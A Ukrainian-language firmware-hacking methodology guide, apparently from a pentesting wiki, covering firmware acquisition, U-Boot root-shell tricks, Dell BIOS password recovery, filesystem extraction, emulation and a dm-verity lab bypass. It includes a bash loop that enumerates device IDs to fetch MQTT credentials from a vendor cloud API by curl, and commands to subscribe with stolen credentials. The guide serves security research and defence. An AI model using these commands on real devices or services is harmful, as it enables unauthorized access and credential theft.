Прошивка — це важливе програмне забезпечення, яке забезпечує належну роботу пристроїв, керуючи зв’язком між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі. Вона зберігається в постійній пам’яті, що дає пристрою доступ до важливих інструкцій відразу після ввімкнення та забезпечує запуск операційної системи. Аналіз прошивки та можливі зміни в ній — важливий етап виявлення вразливостей безпеки.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збирання інформації**

**Збирання інформації** — важливий початковий етап для розуміння будови пристрою та технологій, які він використовує. Цей процес передбачає збирання даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну конфігурацію та технічну документацію
- Показники кодової бази та розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і регуляторні сертифікати
- Архітектурні діаграми та діаграми потоків
- Оцінки безпеки та виявлені вразливості

Для цього незамінними є інструменти **open-source intelligence (OSINT)**, а також аналіз доступних компонентів open-source software за допомогою ручної та автоматизованої перевірки. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний статичний аналіз, який можна використовувати для пошуку потенційних проблем.

## **Отримання прошивки**

Прошивку можна отримати різними способами, кожен із яких має свою складність:

- Отримати **безпосередньо** з джерела (розробників, виробників)
- **Зібрати** за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використовувати запити **Google dork**, щоб знайти розміщені файли прошивки
- Отримати прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплювати **оновлення** за допомогою man-in-the-middle технік
- **Витягнути** прошивку з пристрою через підключення на кшталт **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) або **PICit**
- **Перехоплювати** запити на оновлення під час обміну даними пристрою
- Виявляти та використовувати **зашиті в коді кінцеві точки оновлення**
- **Знімати дамп** із bootloader або через мережу
- Якщо нічого не допомагає, **від’єднати та зчитати** чип пам’яті за допомогою відповідних апаратних інструментів

### Логи лише через UART: примусове відкриття root shell за допомогою U-Boot env у flash

Якщо дані RX UART ігноруються (доступні лише логи), можна примусово відкрити init shell, **відредагувавши blob середовища U-Boot** офлайн:<sup>[[6]](#references)</sup>

1. Зніміть дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3,3 В):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Знайдіть розділ env U-Boot, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 для env U-Boot** для цього blob.
3. Перепрошийте лише розділ env і перезавантажте пристрій; у UART має з’явитися shell.

Це корисно для вбудованих пристроїв, де shell завантажувача вимкнено, але розділ env можна записати через зовнішній доступ до Flash.

### Розкриття захищеного коду через завдання копіювання Firewall

Деякі MCU дозволяють незахищеному коду застосунку викликати шлюз захищеної області замість прямого читання захищеної Flash. Отримавши виконання коду застосунку, перевірте кожне завдання шлюзу як окремий примітив передавання даних у пам’яті. У випадку Cypherock X1 шлюз виклику Firewall STM32L4 приймав завдання, зовнішній вказівник `data`, довжину та захищену `address`. Завдання запису не відхиляло вихідний вказівник `data`, що вказував на код Firewall. Викликаючий код не міг читати цей код безпосередньо, але сам шлюз міг скопіювати його в захищене енергонезалежне сховище, вміст якого можна було отримати за допомогою дозволеного завдання читання.<sup>[[15]](#references)</sup>

Щоб відтворити такий клас розкриття даних, знайдіть доступну для запису сторінку захищеного сховища з відповідним завданням читання, задайте адреси захищеного коду по черзі як джерело для запису та прочитайте скопійовані байти. Перш ніж повторювати запис, перевірте тип носія: у цьому випадку це була Flash, тому перед повторним використанням сторінку потрібно було стерти. Дослідники використали процедуру, яка стирала й відновлювала дійсний вміст Secure Data Storage, а потім розміщували код у вільному просторі, що залишився, не перезаписуючи дані гаманця. Для цього потрібне виконання коду на MCU та доступний шлюз виклику; це не прямий обхід читання з неавтентифікованого хоста.<sup>[[15]](#references)</sup>

Відновлений код може виявити [прогалини в довірі до оновлення прошивки та цілісності завантаження](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Аналіз прошивки

Тепер, коли **у вас є прошивка**, потрібно видобути з неї інформацію, щоб зрозуміти, як із нею працювати. Для цього можна скористатися різними інструментами:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Якщо за допомогою цих інструментів не вдасться знайти багато корисного, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: якщо вона низька, образ навряд чи зашифрований. Якщо висока, імовірно, він зашифрований (або певним чином стиснений).

### Необроблені ресурси дисплея у зовнішній flash-пам’яті

Дамп зовнішньої SPI-пам’яті не обов’язково є виконуваною прошивкою MCU. Для цілі Cortex-M порівняйте початок кожної потенційної ділянки коду з картою пам’яті пристрою: звичайна таблиця векторів починається з правдоподібної адреси вказівника стека SRAM і адреси обробника скидання у виконуваній пам’яті. Відсутність таблиці векторів за нульовим зсувом сама по собі не доводить, що весь чип не містить коду; перевірте інші зсуви та схему завантаження. Якщо `binwalk` не знаходить контейнер, проаналізуйте необроблені байти та зіставте адреси читання flash-пам’яті з [декодованого SPI-захоплення](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) з діями, що завантажують нові екрани.<sup>[[14]](#references)</sup>

Для ділянки з ресурсами дисплея спробуйте різні формати пікселів і розміри, а не припускайте, що це PNG/JPEG. У пристрої, про який ідеться у джерелі, використовувалися кадри **80×160 RGB565 little-endian**: за два байти на піксель кадр має розмір **25 600 байтів** (25 KiB), а не 24 кілобіти. Адреса читання декодованої flash-пам’яті вказала на зсув ресурсу екрана; дослідник перетворив підготовлене зображення командою `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, замінив ресурс такого самого розміру в оригінальному дампі, записав його командою `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` і підтвердив появу нового зображення на дисплеї. Це демонструє можливість запису *зовнішніх ресурсів дисплея*, а не вилучення чи перепрошивання внутрішньої firmware MCU. Збережіть оригінальний дамп і перед будь-яким записом перевірте розміри, порядок байтів, зсув і довжину заміни.<sup>[[14]](#references)</sup>

### Диференційний аналіз flash-пам’яті та відновлювані сховища секретів на основі XOR

Якщо формат зберігання параметра firmware не задокументований, спочатку зробіть кілька відповідних зчитувань flash-пам’яті, змініть **рівно один** параметр, повторно створіть дамп усього чипа та порівняйте зсуви. Повторення експерименту з контрольованими значеннями допоможе відрізнити параметр від лічильників і метаданих запису; зміни за новими зсувами, а не на місці, вказують на сховище лише для додавання або з журналюванням. Зберігайте видалені записи та записи tombstone, оскільки їхні байти корисного навантаження можуть залишатися відновлюваними.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Після визначення області витягніть модулі firmware за допомогою таких інструментів, як `binwalk`, і виконайте reverse engineering writer/validator у Ghidra. Перевірте межі полів, padding, індексацію ключа та derivation ключа в коді, а не робіть висновки про схему лише за шаблонами шифротексту.<sup>[[12]](#references)</sup>

#### Відновлення ключів із зашифрованого нульового padding

Як описано в [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), відомий відкритий текст розкриває байти потоку ключа на тих самих зміщеннях. Поле фіксованого розміру особливо вразливе, коли його нульовий padding охоплює всі індекси повторюваного XOR-ключа: зашифрований padding безпосередньо розкриває ці байти ключа, оскільки `0x00 XOR key_byte = key_byte`. Якщо охоплено всі індекси ключа, відновіть ключ із кінцевої частини шифротексту й розшифруйте заповнені байти.<sup>[[12]](#references)</sup>

Уразливий формат пароля BIOS DVAR від Dell — конкретний приклад: байт `0` поля довжиною 32 байти зберігається у відкритому вигляді, тоді як для байтів `1..31` використовується повторюваний 20-байтовий ключ.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Для пароля довжиною `L` позиції `L..31` до застосування XOR містили нулі. Коли `L <= 12`, ці позиції охоплюють кожен індекс ключа, тож повний ключ і пароль відновлюються без brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Отримання ключів із історичних записів

Не аналізуйте кожен запис окремо. Ключ DVAR приблизно обчислюється як `modified_md5(device_seed || variable_GUID || password[0])`: seed пристрою та GUID незмінні, а єдиний залежний від пароля вхідний параметр — його перший байт у відкритому вигляді. Для кожного пристрою це дає щонайбільше 256 ключів, тому записи, що починаються з однакового байта, мають спільний ключ. Згрупуйте активні та видалені записи за цим байтом: короткий історичний запис може витекти повним ключем через доповнення, що дасть змогу розшифрувати поточний довший запис, для якого власного доповнення недостатньо. Отже, ротація пароля може збільшити ризик витоку, якщо старий зашифрований текст позначено як видалений, а не стерто.<sup>[[12]](#references)</sup>

Інструмент [`dellpwn`](https://github.com/R3n5k1/dellpwn) знаходить DVAR, перевіряє кандидатні записи, відновлює паролі та може відображати сирі байти збережених даних і ключа. Зберіть його з локальної копії репозиторію та проскануйте перевірений образ flash-пам’яті так:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Для власних парсерів відсіюйте хибнопозитивні результати, перевіряючи структуру записів, обмеження на друковані символи, нульове доповнення, ентропію ключа та узгодженість у місці циклічного повторення ключа. Якщо в повторних дампах виявляються поодинокі зміни бітів під час кожного запису, перелічіть зафіксовані маски й ранжуйте можливі виправлення з урахуванням цих обмежень, але неоднозначні символи позначайте як неоднозначні, а не видавайте евристичний результат за точне відновлення.<sup>[[12]](#references)</sup>

Замість зворотно розшифровуваного шифротексту у верифікаторах паролів слід зберігати односпрямований хеш із сіллю та багаторазовим хешуванням, а в журналах із послідовною структурою слід безпечно видаляти замінені секретні дані.<sup>[[12]](#references)</sup>

### Отримання файлової системи

За допомогою згаданих раніше інструментів із коментарями, наприклад `binwalk -ev <bin>`, ви мали змогти **витягти файлову систему**.\
Зазвичай Binwalk витягує її в **папку, названу за типом файлової системи**. Зазвичай це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне витягування файлової системи

Іноді Binwalk **не має сигнатури магічного байта файлової системи**. У таких випадках скористайтеся Binwalk, щоб **знайти зміщення файлової системи та вирізати стиснену файлову систему** з бінарного файла, а потім **вручну витягти** її відповідно до типу, виконавши наведені нижче кроки.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Виконайте наведену нижче команду **dd** для вилучення файлової системи Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Альтернативно можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Відновлення розділених вбудованих кореневих файлових систем

Якщо дамп raw eMMC/SSD містить коректний заголовок файлової системи, але її метадані мають зміщення за межами номінального розділу, не поспішайте вважати її пошкодженою. Код вбудованого завантаження може збирати реальний кореневий пристрій із кількох фізичних діапазонів за допомогою Device Mapper, тому вилучення даних з одного розділу GPT охопить лише перший сегмент.<sup>[[9]](#references)</sup>

#### Первинна перевірка повного образу носія

Спочатку перевірте, чи завершилося отримання образу, чи стабільний його розмір і чи не утримує його досі жоден процес запису. Якщо в назві файла закодовано початкову та кінцеву адреси, порівняйте цей діапазон із фактичною кількістю байтів. Відновіть GPT у режимі лише для читання та підключіть лише потрібний діапазон; **не** запускайте `vgchange -ay` для ненадійного фізичного тому на робочій станції, оскільки можливі конфлікти груп томів і ненавмисний запис.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Використовуйте тимчасову VM, якщо оригінальна логіка ініціалізації або стек LVM має бачити весь образ. Історичні журнали завантаження зі стандартного розділу завантаження особливо корисні: завантажувач міг записати зміщення в пропрієтарному контейнері, довжини компонентів, вибір слота, правила вирівнювання та результати перевірки підпису. Використайте ці значення, щоб вирізати вбудовані командний рядок, ядро та initramfs, а потім окремо перевірте кожен результат за допомогою `file`, магічних байтів і `binwalk`; читання до кінця контейнера може випадково додати до ядра initrd, об’єкт ACPI або підпис.<sup>[[9]](#references)</sup>

#### Відновлення карти блоків під час завантаження

Витягніть initramfs ядра та виконайте реверс `/init` і будь-яких бібліотек для роботи зі сховищем. У [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) знайдіть посилання на рядки `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` і шляхи до розділів, а потім простежте код, який вибирає активний слот A/B і створює таблицю. Корисні початкові команди radare2: `r2 -A init`, `afl`, `pdf @ main` і `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ціль linear відображає послідовні діапазони віртуального пристрою на діапазони одного або кількох базових пристроїв. Відновлена таблиця з двох сегментів зазвичай має такий вигляд (усі позиції та довжини в секторах по 512 байтів):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Відтворюйте арифметику машинного коду точно, зокрема розрядність цілих чисел, зсуви та перетворення одиниць. Наприклад, наведений нижче вираз округлює розмір у байтах вниз до межі 4 КіБ і лише після цього перетворює його на сектори по 512 байтів; заміна на `p4_bytes // 512` зсуває вибраний хвостовий фрагмент на `p4_bytes % 4096`, якщо розділ не вирівняно за сторінкою.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Відновіть плаский образ для аналізу, копіюючи діапазони в порядку таблиці обмеженими за розміром фрагментами, а не завантажуючи весь дамп носія в пам’ять. Це також дає змогу уникнути створення хостових пристроїв-маперів. Зберігайте зміщення, отримані з GPT, обернені кількості секторів і результівну довжину виводу як окремі твердження.<sup>[[9]](#references)</sup>

#### Відрізняйте пошкодження від постійної помилки реконструкції

Для SquashFS перевірте магічне значення `hsqs` і декодуйте поле `bytes_used` у форматі little-endian, 64 біти, за зміщенням 40 у суперблоці, перш ніж запускати `unsquashfs`. Якщо не вдається витягти дані з кількох не пов’язаних між собою структур, виконайте пошук у широкому діапазоні навколо очікуваних позицій і вимагайте переконливих структурних кандидатів: блока метаданих, який можна розпакувати, кількох послідовних коректних записів каталогу, правдоподібних полів inode, кореневого inode, узгодженого з кількістю inode, або коректної структури метаданих цілісності. Одного збігу магічного значення недостатньо.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Коли та сама підписана дельта робить коректними незалежні структури — наприклад, метадані каталогу та запис verity, — імовірною причиною є систематична помилка початку сегмента, а не відсутні байти. Поверніться до зворотної арифметики та перевірте, чи не було відкинуто остачі, неправильно враховано знаковість, переповнення або округлення до межі сектора/сторінки, перш ніж намагатися відновлювати осиротілі дані чи виправляти метадані файлової системи.<sup>[[9]](#references)</sup>

Насамкінець, не змішуйте межі захисту: томи LUKS із ключами, запечатаними в TPM, захищають конфіденційність даних, тоді як підписане відображення dm-verity захищає цілісність кореневої файлової системи. Програмний TPM не відновить ключ, запечатаний у початковому фізичному TPM, а завантаження модифікованої SquashFS через init, призначений лише для досліджень і такий, що пропускає перевірку verity, не підробляє її підпис і не порушує роботу dm-verity.<sup>[[9]](#references)</sup>

## Аналіз прошивки

Після отримання прошивки важливо дослідити її структуру та потенційні вразливості. Для цього використовують різноманітні інструменти, щоб проаналізувати образ прошивки та вилучити цінні дані.

### Інструменти для початкового аналізу

Додаткові інструменти й матеріали для аналізу прошивки наведено в [розділі про прошивки в сторонніх інструментах і ресурсах](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware).

Нижче наведено набір команд для початкової перевірки двійкового файла (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, проаналізувати двійкові дані, а також з’ясувати відомості про розділи та файлові системи:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, тоді як висока може вказувати на шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перегляду файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто в каталог, названий за її типом (наприклад, squashfs, ubifs). Однак, якщо **binwalk** не може розпізнати тип файлової системи через відсутність магічних байтів, її потрібно вилучити вручну. Для цього за допомогою `binwalk` знаходять зміщення файлової системи, а потім використовують команду `dd`, щоб вирізати її:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного видобування вмісту використовують різні команди.

### Аналіз файлової системи

Після видобування файлової системи починається пошук вразливостей. Особливу увагу приділяють незахищеним мережевим демонам, вбудованим обліковим даним, кінцевим точкам API, функціям серверів оновлень, нескомпільованому коду, скриптам запуску та скомпільованим бінарним файлам для офлайн-аналізу.

Серед **ключових розташувань** і **елементів** для перевірки:

- **etc/shadow** та **etc/passwd** — облікові дані користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти, що можуть містити вразливості
- Вбудовані бінарні файли для подальшого аналізу
- Поширені вебсервери та бінарні файли пристроїв IoT

Для виявлення конфіденційної інформації та вразливостей у файловій системі допомагають кілька інструментів:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) — для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — для комплексного аналізу прошивки
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) — для статичного та динамічного аналізу

### Перевірки безпеки скомпільованих бінарних файлів

Вихідний код і скомпільовані бінарні файли, знайдені у файловій системі, потрібно ретельно перевірити на вразливості. Такі інструменти, як **checksec.sh** для бінарних файлів Unix і **PESecurity** для бінарних файлів Windows, допомагають виявити незахищені бінарні файли, які можна експлуатувати.

## Отримання cloud-конфігурації та облікових даних MQTT через похідні URL-токени

Багато IoT-хабів отримують конфігурацію для кожного пристрою з кінцевої точки cloud, яка має такий вигляд:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу прошивки можна виявити, що `<token>` локально обчислюється на основі ідентифікатора пристрою з використанням жорстко заданого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений у вигляді шістнадцяткового рядка у верхньому регістрі

Така конструкція дає змогу будь-кому, хто дізнається deviceId і STATIC_KEY, відновити URL і отримати cloud-конфігурацію, у якій часто містяться облікові дані MQTT у відкритому вигляді та префікси topic.

Практичний порядок дій:

1) Отримайте deviceId з журналів завантаження UART

- Під’єднайте адаптер UART на 3,3 В (TX/RX/GND) і збережіть журнали:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Шукайте рядки, які виводять шаблон URL-адреси конфігурації хмари та адресу брокера, наприклад:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Відновіть STATIC_KEY і алгоритм токена з firmware

- Завантажте бінарні файли в Ghidra/radare2 і знайдіть шлях до конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть токен у Bash і переведіть дайджест у верхній регістр:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Зберіть хмарну конфігурацію та облікові дані MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; проаналізуйте його за допомогою jq, щоб витягти секрети:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Зловживайте незашифрованим MQTT і слабкими ACL для топіків (якщо є)

- Використовуйте знайдені облікові дані, щоб підписатися на топіки технічного обслуговування та шукати конфіденційні події:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Перебирайте передбачувані ідентифікатори пристроїв (у масштабі, за наявності дозволу)

- Багато екосистем містять байти OUI/продукту/типу виробника, за якими йде послідовний суфікс.
- Можна програмно перебирати потенційні ID, генерувати токени та отримувати конфігурації:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Нотатки
- Завжди отримуйте явний дозвіл перед спробою масового переліку.
- За можливості надавайте перевагу емуляції або статичному аналізу для відновлення секретів без модифікації цільового обладнання.


Процес емуляції firmware дає змогу виконувати **динамічний аналіз** роботи пристрою або окремої програми. Такий підхід може зіткнутися з труднощами через залежність від апаратного забезпечення чи архітектури, але перенесення кореневої файлової системи або окремих бінарних файлів на пристрій із відповідною архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може спростити подальше тестування.

### Емуляція окремих бінарних файлів

Для дослідження окремих програм важливо визначити порядок байтів і архітектуру CPU програми.

#### Приклад з архітектурою MIPS

Щоб емулювати бінарний файл для архітектури MIPS, можна скористатися командою:

```bash
file ./squashfs-root/bin/busybox
```

А для встановлення необхідних інструментів емуляції:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарних файлів підійде `qemu-mipsel`.

#### Емуляція архітектури ARM

Для бінарних файлів ARM процес аналогічний: для емуляції використовується емулятор `qemu-arm`.

### Повна емуляція системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують повну емуляцію firmware, автоматизують процес і допомагають у динамічному аналізі.

### Відновлення розділених і верифікованих кореневих файлових систем для емуляції

Якщо superblock SquashFS читається, але зміщення inode, каталогу або таблиці фрагментів неможливі, не виправляйте `unsquashfs` одразу. Проаналізуйте ранній boot-бінарний файл і відтворіть граф блокових пристроїв, який він створює: вбудовані системи можуть надавати номінальний кореневий розділ, але створювати справжню файлову систему за допомогою зіставлення `dm-linear`, що додає сектори, позичені з іншого розділу. Перевірка лише superblock може пройти успішно, навіть якщо всі наступні блоки метаданих зміщені.<sup>[[11]](#references)</sup>

Точно відтворюйте арифметику firmware. Зокрема, визначте, чи вимірюються довжини в байтах, секторах по 512 байтів або сторінках по 4 КіБ; відтворіть зсуви й усічення в початковому порядку; врахуйте залежні від банку кінцеві ділянки в конфігураціях A/B. Наприклад, `(partition_bytes >> 12) << 3` спершу усікає значення до межі 4 КіБ і лише потім виражає результат у секторах по 512 байтів; заміна на `partition_bytes // 512` може змістити доданий діапазон на кілька кілобайтів і пошкодити всі наступні таблиці SquashFS.<sup>[[11]](#references)</sup>

Корисний процес перевірки:<sup>[[11]](#references)</sup>

1. Визначте з бінарного файлу verifier/init пристрій-джерело, початковий сектор і довжину кожного сегмента `dm-linear`.
2. Об’єднайте або зіставте ділянки, не змінюючи семантику їхнього вирівнювання.
3. Якщо видобування все ще не вдається, виконайте пошук лише в невеликому діапазоні навколо передбаченої межі й вимагайте наявності кількох послідовних коректних структур метаданих, а не приймайте лише правдоподібний superblock.
4. Запустіть незмінений `unsquashfs` для відновленого образу; успішний обхід усіх каталогів і фрагментів є переконливішим доказом, ніж `unsquashfs -stat`.

#### Заміна dm-verity під контролем аналітика

Коли аналітик контролює ядро QEMU, initramfs і віртуальні диски, змінену кореневу файлову систему можна завантажити, замінивши PID 1 виробника, що виконує перевірку, невеликим статично скомпонованим init. Це **підміна ланцюжка завантаження в лабораторії**, а не злам dm-verity, його підпису RSA, Secure Boot чи ключа, захищеного TPM.<sup>[[11]](#references)</sup>

Замінний init має відтворювати операційні етапи початкового процесу завантаження: змонтувати `devtmpfs`, викликати `setsid()`, під’єднати `/dev/console` до файлових дескрипторів 0–2, змонтувати `/proc` і `/sys`, дочекатися наданого блокового пристрою, змонтувати відредаговану кореневу файлову систему лише для читання, від’єднати псевдофайлові системи старого кореня, перемістити нове монтування до `/` за допомогою `MS_MOVE`, виконати `chroot` і запустити `execve()` оригінального `/sbin/init` firmware. Від’єднання `/dev`, `/proc` і `/sys` **до** `MS_MOVE` запобігає випадковому від’єднанню точок монтування, що належать новій кореневій файловій системі.<sup>[[11]](#references)</sup>

Зберігайте змінний стан пристрою окремо від зміненої незмінної кореневої файлової системи. Оверлей qcow2 може зберегти стан LVM початкового диска, тоді як другий віртуальний диск virtio лише для читання надає відредаговану SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Налагодження стану образу офлайн

Перевіряйте постійний стан поза гостьовою системою, якщо повільне завантаження, руйнівні скрипти запуску або ненадійне журналювання консолі ускладнюють виявлення збою. Ніколи не підключайте overlay, який використовує запущена VM; відкрийте його за допомогою `qemu-nbd`, обмежте пошук LVM потрібним розділом NBD і деактивуйте групу томів перед від’єднанням.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Для відтворюваної ізоляції несправностей записуйте файли-маркери з часовими мітками на стабільний том із правом запису та перевіряйте їх офлайн; `/dev/kmsg`, FIFO та тимчасові консолі можуть давати хибнонегативні результати через обмеження частоти запису або передчасне завершення процесу. Також перед зміною не пов’язаного з проблемою коду порівнюйте точні інтерфейси між рівнями: `uname -r` і `/lib/modules/`, функції ext4 на диску та конфігурацію ядра, а також покоління Mesa `libGL`, ABI драйвера DRI та назви драйверів, визначені за PCI. Компонент може існувати й навіть успішно завантажуватися через `dlopen()`, але залишатися непридатним до використання, якщо його споживач очікує інший ABI.<sup>[[11]](#references)</sup>

## Практичний динамічний аналіз

На цьому етапі для аналізу використовують реальне або емульоване середовище пристрою. Важливо зберегти доступ до оболонки ОС і файлової системи. Емуляція може не повністю відтворювати взаємодію з обладнанням, тому іноді доводиться перезапускати емуляцію. Під час аналізу слід повторно перевірити файлову систему, дослідити відкриті вебсторінки й мережеві служби, а також перевірити завантажувач на вразливості. Перевірки цілісності firmware критично важливі для виявлення потенційних вразливостей backdoor.

## Методи аналізу під час виконання

